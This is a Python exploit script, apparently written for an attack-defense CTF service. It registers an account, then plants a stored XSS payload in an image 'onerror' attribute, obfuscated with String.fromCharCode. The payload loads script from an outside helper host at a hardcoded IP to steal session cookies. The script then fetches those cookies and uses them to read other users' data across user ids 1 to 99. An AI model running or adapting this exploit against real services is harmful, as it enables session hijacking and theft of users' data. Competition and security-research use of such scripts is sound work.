#!usr/bin/env python3

import checklib
import os
import tempfile
import requests
import time
import sys

IP = '127.0.0.1'

if len(sys.argv) > 1:
    IP = sys.argv[1]

# some PUBLIC url to
helper_url = 'http://188.225.35.105:8001'

def get_id(u_id):
    resp = requests.get(f'{helper_url}/key', params={'ip': IP, 'id': u_id})
    if resp.status_code == 200:
        return resp.json()['cookie']
    return None

def leak_key():
    email = checklib.rnd_username() + '@cbsctf.live'
    password = checklib.rnd_password()

    s = requests.Session()
    resp = s.post(f'http://{IP}:8000/api/register', json={'email': email, 'password': password}, headers={'Accept-Encoding': 'application/json'})

    print(resp.text)

    pwn_url = f'<script src="{helper_url}/hckk?ip={IP}"></script>'

    print(pwn_url)

    pwn_code = []
    for c in pwn_url:
        x = 'String.fromCharCode({})'.format(ord(c))
        pwn_code.append(x)

    sploit = 'document.write(' + '+'.join(pwn_code) + ')'

    print(sploit)

    params = {'width': '50%', 'onerror': sploit}
    sync_data = {'capacity': 10, 'title': 'Anime sync!', 'description': 'Join us at kek on kek', 'image_url':'http://keklolkek.kek', 'image_params': params}

    resp = s.post(f'http://{IP}:8000/api/sync', json=sync_data)

    print(resp.text)
    data = resp.json()
    sync_id = data['id']
    print(data, sync_id)


    resp = requests.post('http://{}:8000/api/sync/{}/join'.format(IP, sync_id), json={'nickname': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='})
    print(resp.text)

def healtcheck():
    cookie = get_id(1)
    if cookie is None:
        leak_key()
        cookie = get_id(1)
    if cookie is None:
        print("Failed to get cookie after leak", flush=True)
        sys.exit(1)
    resp = requests.get(f'http://{IP}:8000/api/sync', cookies={'session_token': cookie})
    if resp.status_code != 200:
        leak_key()
        resp = requests.get(f'http://{IP}:8000/api/sync', cookies={'session_token': cookie})
    if resp.status_code != 200:
        print("Failed to generate good cookie", flush=True)
        sys.exit(1)

healtcheck()

for u in range(1, 100):
    cookie = get_id(u)
    resp = requests.get(f'http://{IP}:8000/api/sync', cookies={'session_token': cookie})
    if resp.status_code != 200:
        continue
    for s in resp.json():
        sync_id = s.get('id')
        resp = requests.get('http://{}:8000/api/sync/{}'.format(IP, sync_id), cookies={'session_token': cookie})
        print(resp.text, flush=True)

